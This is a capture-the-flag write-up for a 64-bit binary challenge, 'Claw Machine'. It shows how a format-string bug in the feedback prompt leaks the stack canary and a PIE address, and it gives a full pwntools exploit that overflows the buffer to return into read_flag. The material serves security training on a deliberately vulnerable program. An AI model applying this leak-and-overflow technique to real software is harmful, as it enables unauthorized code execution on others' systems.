
# Synopsis

Claw Machine is an Medium difficulty challenge that features bypassing canaries and dealing with PIE to call a function that reads the flag (ret2win).

# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	
Full RELRO   Canary found      NX enabled   PIE enabled          No RPATH   RW-RUNPATH   90 Symbols	  No
```

### Protections ðŸ›¡ï¸

As we can see:

| Protection | Enabled  | Usage   |
| :---:      | :---:    | :---:   |
| **Canary** | âœ…      | Prevents **Buffer Overflows**  |
| **NX**     | âœ…      | Disables **code execution** on stack |
| **PIE**    | âœ…       | Randomizes the **base address** of the binary |
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

Running `file`, we also notice the the binary is `64-bit` and `dynamically linked`.

```console
âžœ  claw_machine: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0dcdc3f9bead6c2a31478a42c3a9e13e478a230f, not stripped
```

The interface of the program looks like this:

```console
âžœ  ./claw_machine
â–›â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–œ
â–Œâ–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–
â–Œâ–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–
â–ˆ            |             â–ˆ
â–ˆ            |             â–ˆ
â–ˆ            |             â–ˆ
â–ˆ         /â–”â–” â–”â–”\          â–ˆ
â–ˆ        |       |         â–ˆ
â–ˆ         \     /          â–ˆ
â–ˆ                          â–ˆ
â–ˆ                          â–ˆ
â–ˆ        __________        â–ˆ
â–ˆ        |flag.txt|        â–ˆ
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ

Press '1' to move left, '2' to move right, '9' to grab the prize!

>>
```
After attempting to grab the prize no matter how much you move you will break the box and be offered to rate the game:

```console
â–›â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–€â–œ
â–Œâ–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–“â–’â–
â–Œâ–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–„â–
â–ˆ            |             â–ˆ
â–ˆ            |             â–ˆ
â–ˆ            |             â–ˆ
â–ˆ            |             â–ˆ
â–ˆ            |             â–ˆ
â–ˆ            |             â–ˆ
â–ˆ         /â–”â–” â–”â–”\          â–ˆ
â–ˆ        |       |         â–ˆ
â–ˆ         \     /          â–ˆ
â–ˆ        |flag.txt|        â–ˆ
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ

[-] You broke the box and couldn't get the prize!

Would you like to rate our game? (y/n)

>> y

Enter your name: TESTNAME

Thank you for giving feedback TESTNAME

Leave your feedback here: FEEDTEST

Thank you for playing!
```
Upon agreeing to rate the game you can insert your name and your feedback.

### Disassembly â›ï¸

Taking a look at the psuedocode generated by ida for the function that handles feedback (fb) we can first identify a string format vuln, perhaps allowing us to leak PIE or Canaries?

```C
unsigned __int64 fb()
{
  __int16 buf; // [rsp+Dh] [rbp-73h] BYREF
  char v2; // [rsp+Fh] [rbp-71h]
  char format[8]; // [rsp+10h] [rbp-70h] BYREF
  __int64 v4; // [rsp+18h] [rbp-68h]
  char v5; // [rsp+20h] [rbp-60h]
  __int64 v6[9]; // [rsp+30h] [rbp-50h] BYREF
  unsigned __int64 v7; // [rsp+78h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  buf = 0;
  v2 = 0;
  *(_QWORD *)format = 0LL;
  v4 = 0LL;
  v5 = 0;
  memset(v6, 0, 64);
  printf("Would you like to rate our game? (y/n)\n\n>> ");
  read(0, &buf, 2uLL);
  if ( (_BYTE)buf == 121 || (_BYTE)buf == 89 )
  {
    printf("\nEnter your name: ");
    read(0, format, 0x10uLL);
    printf("\nThank you for giving feedback ");
    printf(format);
    printf("\nLeave your feedback here: ");
    read(0, v6, 0x5EuLL);
  }
  puts("\nThank you for playing!\n");
  return __readfsqword(0x28u) ^ v7;
}
```
Lets attempt to overflow the buffer:

```console
Enter your name: no

Thank you for giving feedback no

Leave your feedback here: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Thank you for playing!

*** stack smashing detected ***: <unknown> terminated
zsh: IOT instruction (core dumped)  ./claw_machine
```
Shit. Canaries :)

Also did some testing and found out that you have 72 bytes before hitting the canary :)

### Debugging 

Ok, time to go hunt for some canaries,
In linux canaries end in 00. This makes them pretty easy to spot. to figure out which values correspond to a canary i used a quick python script:
```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./claw_machine', checksec=False)

# Let's fuzz x values
for i in range(300):
    try:
        if True:
            # Create process (level used to reduce noise)
            p = process(level='error')
            p.recvuntil(b">> ")
            p.sendline(b'9')
            p.recvuntil(b">> ")
            p.sendline(b'y')
            p.recvuntil(b': ')
            p.sendline('%{}$p'.format(i).encode())
            p.recvline()
            result = p.recvline().decode()
            if result:
                print(str(i) + ': ' + str(result[result.index("k",20)+1:]).strip()) #i know this is made badly... Leave me alone.
    except EOFError:
        pass
#  Canaries will look like this:
#  0x5020c933db88ab00
#  0x459415b8e048d00
#  makes em really easy to see
```
after running this script a couple times i managed to not only find that a canary sits on the 21st value on the stack (%21$p) but also that we have the address of Main+53 at the 23rd value on the stack (%23$p)
the address of main+53 is on the stack due because its the return value :)

Since we know that the return value sits 2 spots after the canary on the stack we know that our payload should look something like this:

(72 bytes) + (canary) + (8 bytes) + (read_flag)

# Solution

```python
from pwn import *
elf = context.binary = ELF('./claw_machine', checksec=False)
#context.terminal = ["alacritty",'-e','zsh','-c']
#p = gdb.debug("./claw_machine",gdbscript='''
    #break fb
    #continue
    #''')
#p = process(level='error')
#p = remote("IP", "PORT")
p.recvuntil(b">> ")
p.sendline(b'9')
p.recvuntil(b">> ")
p.sendline(b'y')
p.recvuntil(b': ')
p.sendline('%21$p %23$p'.encode())
p.recvline()
x = p.recvline().decode()
canary = x[x.index("k",20)+2:]
elf.address = eval(canary.split(" ")[1].strip())-0x1552
p.recvline()
payload = flat(
    b'A'*72,
    eval(canary.split(" ")[0]),
    b"A"*8,
    elf.symbols.read_flag
)
p.send(payload)
p.recvline()
p.recvline()
p.recvline()
p.interactive()

```
